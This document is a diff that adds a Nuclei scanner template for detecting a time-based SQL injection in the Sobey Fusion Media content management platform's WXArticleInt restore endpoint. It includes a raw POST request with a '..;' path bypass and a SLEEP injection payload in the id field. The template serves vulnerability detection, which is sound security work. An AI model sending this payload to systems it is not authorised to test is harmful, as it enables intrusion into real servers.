@@ -1,0 +1,36 @@
+id: sobey-imcmp-wxarticleint-restore-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform WXArticleInt_restore SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        siteCode=&token=&id=1 AND (SELECT * FROM (SELECT(SLEEP({{t1}})))x)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"data":'
+          - '"status":400'
+          - '组稿还原异常'
+        condition: and
+        part: body
+      - type: dsl
+        dsl:
+          - '!contains(body, "<")'
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
